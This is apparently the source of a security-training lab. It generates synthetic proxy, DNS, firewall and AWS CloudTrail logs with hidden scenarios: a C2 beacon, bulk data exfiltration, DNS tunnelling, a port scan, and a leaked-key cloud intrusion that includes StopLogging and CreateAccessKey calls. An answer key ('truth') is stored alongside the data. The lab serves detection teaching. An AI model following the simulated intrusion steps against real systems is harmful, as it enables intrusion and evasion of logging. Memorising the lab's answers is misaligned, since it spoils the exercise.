  teams: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Teams/1.7',
  agent: 'TelemetryAgent/4.2 (Windows)',
  beacon: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
  curl: 'curl/8.4.0',
};

registerDataset({
  id: 'proxy',
  title: 'Web proxy',
  spl: 'proxy',
  kql: 'CommonSecurityLog',
  sourcetype: 'proxy:access',
  seed: 8080,
  blurb: 'Outbound web requests from the office through the forward proxy: who went where, how much data moved each way.',
  fields: ['src', 'user', 'dest_host', 'url', 'http_method', 'status', 'bytes_out', 'bytes_in', 'http_user_agent', 'category', 'action'],
  names: {
    spl: {},
    kql: { src: 'SourceIP', user: 'SourceUserName', dest_host: 'DestinationHostName', url: 'RequestURL', http_method: 'RequestMethod', status: 'EventOutcome', bytes_out: 'SentBytes', bytes_in: 'ReceivedBytes', http_user_agent: 'RequestClientApplication', category: 'RequestContext', action: 'DeviceAction' },
  },
  aliases: { src_ip: 'src', client_ip: 'src', dest: 'dest_host', domain: 'dest_host', host_header: 'dest_host', method: 'http_method', useragent: 'http_user_agent', user_agent: 'http_user_agent', bytes_sent: 'bytes_out', bytes_received: 'bytes_in' },
  generate(h, truth) {
    const ev = [];
    const add = (e) => {
      e._raw = `${iso(e._time)} src=${e.src} user=${e.user} method=${e.http_method} url="${e.url}" status=${e.status} bytes_out=${e.bytes_out} bytes_in=${e.bytes_in} category="${e.category}" action=${e.action} ua="${e.http_user_agent}"`;
      ev.push(e);
    };
    const sites = [
      ['www.example.com', 'Business', ['/', '/news', '/products/view?id=']],
      ['portal.example.com', 'Business', ['/login', '/dashboard', '/api/items?page=']],
      ['docs.example.org', 'Reference', ['/guide/', '/search?q=']],
      ['cdn.example.net', 'Content Delivery', ['/static/app.js', '/img/logo.png', '/fonts/inter.woff2']],
      ['news.example.net', 'News', ['/world', '/tech/', '/sport']],
      ['mail.example.org', 'Web Mail', ['/owa/', '/owa/service.svc?action=']],
      ['video.example.com', 'Streaming', ['/watch?v=', '/api/stats']],
      ['shop.example.com', 'Shopping', ['/cart', '/item/']],
      ['files.example.com', 'File Sharing', ['/share/', '/download/']],
    ];
    const clients = ORG.workstations.map((ws, i) => ({ ip: `10.20.${4 + (i % 5)}.${10 + i}`, user: ORG.users[i] }));
    // browsing sessions: bursts of requests
    let n = 0;
    while (n < 2150) {
      const c = h.pick(clients);
      let t = h.time();
      const [host, cat, paths] = h.pick(sites);
      const burst = h.int(3, 14);
      for (let j = 0; j < burst; j++, n++) {
        t += h.int(0, 40);
        const blocked = cat === 'Streaming' && h.chance(0.3);
        const method = h.chance(0.88) ? 'GET' : 'POST';
        add({ _time: t, src: c.ip, user: c.user, dest_host: host, url: `https://${host}${h.pick(paths)}${h.chance(0.4) ? h.int(1, 999) : ''}`, http_method: method, status: blocked ? 403 : h.wpick([[200, 90], [304, 6], [404, 3], [500, 1]]), bytes_out: method === 'POST' ? h.int(800, 9000) : h.int(300, 1400), bytes_in: blocked ? 512 : h.int(1500, 900000), http_user_agent: UA.edge, category: cat, action: blocked ? 'blocked' : 'allowed' });
      }
    }
    // Teams chatter
    for (let i = 0; i < 260; i++) {
      const c = h.pick(clients);
      add({ _time: h.time(), src: c.ip, user: c.user, dest_host: 'teams.example.net', url: 'https://teams.example.net/api/chatsvc/messages', http_method: h.pick(['GET', 'POST']), status: 200, bytes_out: h.int(400, 3000), bytes_in: h.int(800, 20000), http_user_agent: UA.teams, category: 'Collaboration', action: 'allowed' });
    }
    // DECOY: legitimate telemetry agent on every workstation, every 5 minutes with jitter
    for (const c of clients.slice(0, 8)) {
      for (let t = START + h.int(0, 300); t < LAB_NOW; t += 300 + h.int(-45, 45)) {
        if (h.chance(0.35)) continue; // laptops asleep / off network
        add({ _time: t, src: c.ip, user: c.user, dest_host: 'telemetry.example.com', url: 'https://telemetry.example.com/v2/ping', http_method: 'POST', status: 200, bytes_out: h.int(700, 1100), bytes_in: 230, http_user_agent: UA.agent, category: 'Software Updates', action: 'allowed' });
      }
    }
    // BEACON: 10.20.4.17 calls home every 60s +/- 3s for six hours
    const bsrc = '10.20.4.17';
    const buser = 't.brown';
    let bt = T(2, 58, 7);
    let beacons = 0;
    while (bt < T(8, 58)) {
      add({ _time: bt, src: bsrc, user: buser, dest_host: 'cdn-update.example.net', url: `http://cdn-update.example.net/api/v1/check?id=7f3a${h.hex(4)}`, http_method: 'GET', status: 200, bytes_out: h.int(310, 360), bytes_in: h.chance(0.05) ? h.int(4000, 9000) : h.int(140, 190), http_user_agent: UA.beacon, category: 'Uncategorized', action: 'allowed' });
      beacons++;
      bt += 60 + h.int(-3, 3);
    }
    // EXFIL: r.kowalski uploads large archives to a file-sharing site at night
    const esrc = clients[ORG.users.indexOf('r.kowalski') % clients.length];
    let et = T(6, 2, 0);
    let exBytes = 0;
    for (let i = 0; i < 42; i++) {
      const b = h.int(1_400_000, 2_300_000);
      exBytes += b;
      add({ _time: et, src: esrc.ip, user: 'r.kowalski', dest_host: 'upload.sharebox.example', url: `https://upload.sharebox.example/api/v2/chunk?part=${i + 1}`, http_method: 'POST', status: 200, bytes_out: b, bytes_in: 310, http_user_agent: UA.curl, category: 'File Sharing', action: 'allowed' });
      et += h.int(30, 90);
    }
    Object.assign(truth, { beaconSrc: bsrc, beaconHost: 'cdn-update.example.net', beaconUser: buser, beacons, exfilUser: 'r.kowalski', exfilSrc: esrc.ip, exfilHost: 'upload.sharebox.example', exfilBytes: exBytes });
    return ev;
  },
});

// =================================================================== DNS

registerDataset({
  id: 'dns',
  title: 'DNS queries',
  spl: 'dns',
  kql: 'DnsEvents',
  sourcetype: 'dns:query',
  seed: 53,
  blurb: 'Queries seen by the internal resolvers: which client asked for which name, the record type and the response code.',
  fields: ['src', 'query', 'query_type', 'reply_code', 'answer', 'dns_server'],
  names: {
    spl: {},
    kql: { src: 'ClientIP', query: 'Name', query_type: 'QueryType', reply_code: 'ResultCode', answer: 'IPAddresses', dns_server: 'Computer' },
  },
  aliases: { src_ip: 'src', client_ip: 'src', domain: 'query', qname: 'query', qtype: 'query_type', rcode: 'reply_code' },
  generate(h, truth) {
    const ev = [];
    const add = (e) => {
      e._raw = `${iso(e._time)} client=${e.src} query=${e.query} type=${e.query_type} rcode=${e.reply_code} answer=${e.answer || '-'} server=${e.dns_server}`;
      ev.push(e);
    };
    const names = ['www.example.com', 'portal.example.com', 'login.example.com', 'mail.example.org', 'teams.example.net', 'cdn.example.net', 'intranet.corp.example', 'fileshare.corp.example', 'docs.example.org', 'updates.example.net', 'news.example.net', 'telemetry.example.com', 'time.example.org', 'api.example.com'];
    const clients = Array.from({ length: 40 }, (_, i) => `10.20.${4 + (i % 5)}.${10 + i}`);
    const ans = (q) => (q.endsWith('corp.example') ? `10.10.2.${h.int(10, 60)}` : `198.51.100.${h.int(1, 250)}`);
    for (let i = 0; i < 1900; i++) {
      const q = h.pick(names);
      const qt = h.wpick([['A', 70], ['AAAA', 22], ['HTTPS', 6], ['MX', 2]]);
      add({ _time: h.time(), src: h.pick(clients), query: q, query_type: qt, reply_code: 'NOERROR', answer: qt === 'A' ? ans(q) : '', dns_server: h.pick(['DC01', 'DC02']) });
    }
    // CDN hostnames: long-ish but legitimate, many clients
    for (let i = 0; i < 160; i++) add({ _time: h.time(), src: h.pick(clients), query: `e${h.int(1000, 9999)}.dscx.edge-${h.pick(['a', 'b', 'c'])}.cdnprovider.example`, query_type: 'A', reply_code: 'NOERROR', answer: `203.0.113.${h.int(1, 250)}`, dns_server: h.pick(['DC01', 'DC02']) });
    // AV reputation lookups: hash-like labels, but short queries from many hosts (decoy)
    for (let i = 0; i < 120; i++) add({ _time: h.time(), src: h.pick(clients), query: `${h.hex(16)}.rep.av-cloud.example`, query_type: 'TXT', reply_code: 'NOERROR', answer: '', dns_server: h.pick(['DC01', 'DC02']) });
    // typos -> NXDOMAIN
    for (let i = 0; i < 70; i++) add({ _time: h.time(), src: h.pick(clients), query: h.pick(['wwww.example.com', 'portl.example.com', 'intranet.corp.exmaple', 'mial.example.org']), query_type: 'A', reply_code: 'NXDOMAIN', answer: '', dns_server: h.pick(['DC01', 'DC02']) });
    // TUNNEL: long, unique base32 labels under one domain, TXT, from one host
    const tsrc = '10.20.7.31';
    let t = T(1, 12, 0);
    let tn = 0;
    while (t < T(4, 30)) {
      add({ _time: t, src: tsrc, query: `${h.b32(h.int(52, 60))}.${h.b32(8)}.t.sync-data.example`, query_type: 'TXT', reply_code: 'NOERROR', answer: '', dns_server: 'DC01' });
      tn++;
      t += h.int(15, 40);
    }
    Object.assign(truth, { tunnelSrc: tsrc, tunnelDomain: 'sync-data.example', tunnelQueries: tn });
    return ev;
  },
});

// =================================================================== Firewall

registerDataset({
  id: 'firewall',
  title: 'Firewall',
  spl: 'firewall',
  kql: 'AZFWNetworkRule',
  sourcetype: 'pan:traffic',
  seed: 445,
  blurb: 'Allowed and denied connections through the internal segmentation firewall.',
  fields: ['src_ip', 'src_port', 'dest_ip', 'dest_port', 'transport', 'action', 'bytes', 'rule'],
  names: {
    spl: {},
    kql: { src_ip: 'SourceIp', src_port: 'SourcePort', dest_ip: 'DestinationIp', dest_port: 'DestinationPort', transport: 'Protocol', action: 'Action', bytes: 'Bytes', rule: 'Rule' },
  },
  aliases: { src: 'src_ip', dest: 'dest_ip', dst: 'dest_ip', dst_ip: 'dest_ip', port: 'dest_port', dst_port: 'dest_port', protocol: 'transport', proto: 'transport' },
  generate(h, truth) {
    const ev = [];
    const add = (e) => {
      e._raw = `${iso(e._time)} ${e.action.toUpperCase()} ${e.transport} ${e.src_ip}:${e.src_port} -> ${e.dest_ip}:${e.dest_port} bytes=${e.bytes} rule=${e.rule}`;
      ev.push(e);
    };
    const flows = [
      ['10.10.2.10', 445, 'tcp', 'allow-smb-fileserver'],
      ['10.10.2.20', 1433, 'tcp', 'allow-sql-app'],
      ['10.10.2.30', 443, 'tcp', 'allow-web'],
      ['10.10.0.10', 53, 'udp', 'allow-dns'],
      ['10.10.0.11', 53, 'udp', 'allow-dns'],
      ['10.10.0.10', 88, 'tcp', 'allow-kerberos'],
      ['10.10.0.10', 389, 'tcp', 'allow-ldap'],
      ['10.10.2.60', 9100, 'tcp', 'allow-print'],
      ['10.10.2.50', 3389, 'tcp', 'allow-rdp-jump'],
    ];
    const clients = Array.from({ length: 40 }, (_, i) => `10.0.${4 + (i % 4)}.${10 + i}`);
    for (let i = 0; i < 1750; i++) {
      const [d, p, tr, rule] = h.pick(flows);
      add({ _time: h.time(), src_ip: h.pick(clients), src_port: h.int(49152, 65535), dest_ip: d, dest_port: p, transport: tr, action: 'allow', bytes: h.int(200, 250000), rule });
    }
    // policy denies (people trying blocked services)
    for (let i = 0; i < 120; i++) add({ _time: h.time(), src_ip: h.pick(clients), src_port: h.int(49152, 65535), dest_ip: `10.0.8.${h.int(10, 60)}`, dest_port: h.pick([22, 3389, 5900, 8080]), transport: 'tcp', action: 'deny', bytes: 0, rule: 'default-deny' });
    // DECOY: authorised vulnerability scanner sweeps many hosts on a few ports (scheduled)
    const vports = [21, 22, 23, 25, 80, 139, 443, 445, 3389, 8080, 8443, 5985];
    for (let hst = 10; hst < 60; hst++) for (const p of vports) if (h.chance(0.6)) add({ _time: Y(22, 0) + h.int(0, 3000), src_ip: '10.0.9.5', src_port: h.int(40000, 60000), dest_ip: `10.0.8.${hst}`, dest_port: p, transport: 'tcp', action: h.chance(0.8) ? 'deny' : 'allow', bytes: h.int(0, 400), rule: h.chance(0.8) ? 'default-deny' : 'allow-vulnscan' });
    // SCAN: a compromised workstation probes two servers across ~150 ports
    const ssrc = '10.0.5.23';
    const ports = [];
    for (let p = 1; p <= 1024 && ports.length < 150; p += h.int(1, 12)) ports.push(p);
    let t = T(6, 3, 0);
    for (const dst of ['10.0.8.21', '10.0.8.22']) for (const p of ports) {
      add({ _time: t, src_ip: ssrc, src_port: h.int(40000, 60000), dest_ip: dst, dest_port: p, transport: 'tcp', action: [22, 80, 443, 445].includes(p) ? 'allow' : 'deny', bytes: h.int(0, 120), rule: [22, 80, 443, 445].includes(p) ? 'allow-server-mgmt' : 'default-deny' });
      t += h.int(0, 2);
    }
    Object.assign(truth, { scanSrc: ssrc, scanPorts: ports.length, vulnScanner: '10.0.9.5' });
    return ev;
  },
});

// =================================================================== Cloud audit (AWS CloudTrail)

registerDataset({
  id: 'cloud',
  title: 'AWS CloudTrail',
  spl: 'aws_cloudtrail',
  kql: 'AWSCloudTrail',
  sourcetype: 'aws:cloudtrail',
  seed: 2026,
  blurb: 'AWS API calls: who (identity), what (eventName), from where (source IP) and whether it failed (errorCode).',
  fields: ['eventName', 'eventSource', 'userName', 'userArn', 'src_ip', 'errorCode', 'awsRegion', 'userAgent', 'requestParameters'],
  names: {
    spl: {},
    kql: { eventName: 'EventName', eventSource: 'EventSource', userName: 'UserIdentityUserName', userArn: 'UserIdentityArn', src_ip: 'SourceIpAddress', errorCode: 'ErrorCode', awsRegion: 'AWSRegion', userAgent: 'UserAgent', requestParameters: 'RequestParameters' },
  },
  aliases: { user: 'userName', src: 'src_ip', sourceIPAddress: 'src_ip', 'userIdentity.userName': 'userName', 'userIdentity.arn': 'userArn', error: 'errorCode' },
  generate(h, truth) {
    const ev = [];
    const add = (e) => {
      e.userArn = `arn:aws:iam::111122223333:user/${e.userName}`;
      e.awsRegion = e.awsRegion || 'us-east-1';
      e._raw = JSON.stringify({ eventTime: iso(e._time), eventSource: e.eventSource, eventName: e.eventName, sourceIPAddress: e.src_ip, userIdentity: { userName: e.userName }, errorCode: e.errorCode || undefined, requestParameters: e.requestParameters || undefined });
      ev.push(e);
    };
    const normal = [
      ['s3.amazonaws.com', 'GetObject'], ['s3.amazonaws.com', 'PutObject'], ['s3.amazonaws.com', 'ListObjects'],
      ['ec2.amazonaws.com', 'DescribeInstances'], ['ec2.amazonaws.com', 'DescribeSecurityGroups'],
      ['sts.amazonaws.com', 'AssumeRole'], ['cloudwatch.amazonaws.com', 'GetMetricData'], ['logs.amazonaws.com', 'FilterLogEvents'],
      ['lambda.amazonaws.com', 'Invoke'], ['iam.amazonaws.com', 'GetUser'],
    ];
    const people = [['l.chen', '10.10.3.24', 'console.amazonaws.com'], ['adm.sokafor', '10.10.6.29', 'aws-cli/2.17'], ['j.nguyen', '10.10.3.21', 'aws-cli/2.17'], ['ci-deployer', '10.30.1.5', 'Boto3/1.35 terraform'], ['app-backend', '10.30.2.14', 'aws-sdk-java/2.25']];
    for (let i = 0; i < 1060; i++) {
      const [u, ip, ua] = h.wpick(people.map((p) => [p, p[0] === 'app-backend' ? 5 : p[0] === 'ci-deployer' ? 3 : 1]));
      const [src, name] = h.pick(normal);
      const denied = h.chance(0.015);
      add({ _time: h.time(), eventName: name, eventSource: src, userName: u, src_ip: ip, errorCode: denied ? 'AccessDenied' : '', userAgent: ua });
    }
    // the attack: ci-deployer's leaked key used from an external IP
    const atk = '203.0.113.200';
    const probes = ['ListUsers', 'GetAccountAuthorizationDetails', 'ListRoles', 'DescribeInstances', 'GetBucketPolicy', 'ListSecrets', 'GetSecretValue', 'DescribeDBInstances', 'ListAccessKeys', 'CreateUser', 'AttachUserPolicy', 'ListFunctions'];
    const srcOf = (n) => (/User|Role|Policy|Access|Account/.test(n) ? 'iam.amazonaws.com' : /Secret/.test(n) ? 'secretsmanager.amazonaws.com' : /DB/.test(n) ? 'rds.amazonaws.com' : /Instances/.test(n) ? 'ec2.amazonaws.com' : /Function/.test(n) ? 'lambda.amazonaws.com' : 's3.amazonaws.com');
    let t = T(7, 10, 0);
    let denied = 0;
    for (let i = 0; i < 86; i++) {
      const n = h.pick(probes);
      add({ _time: t, eventName: n, eventSource: srcOf(n), userName: 'ci-deployer', src_ip: atk, errorCode: 'AccessDenied', userAgent: 'aws-cli/2.13 Python/3.11 Linux/6.5 exe/x86_64.kali' });
      denied++;
      t += h.int(1, 6);
    }
    const ok = [
      ['GetCallerIdentity', 'sts.amazonaws.com', ''],
      ['ListBuckets', 's3.amazonaws.com', ''],
      ['GetObject', 's3.amazonaws.com', '{"bucketName":"corp-tfstate","key":"prod/terraform.tfstate"}'],
      ['StopLogging', 'cloudtrail.amazonaws.com', '{"name":"org-trail"}'],
      ['CreateAccessKey', 'iam.amazonaws.com', '{"userName":"ci-deployer"}'],
    ];
    ok.forEach(([n, src, rp], i) => add({ _time: T(7, 9, 40) + (i === 0 ? 0 : 400 + i * 45), eventName: n, eventSource: src, userName: 'ci-deployer', src_ip: atk, errorCode: '', userAgent: 'aws-cli/2.13 Python/3.11 Linux/6.5 exe/x86_64.kali', requestParameters: rp }));
    Object.assign(truth, { cloudAttacker: atk, cloudDenied: denied, cloudSucceeded: ok.map((x) => x[0]), cloudUser: 'ci-deployer' });
    return ev;
  },
});
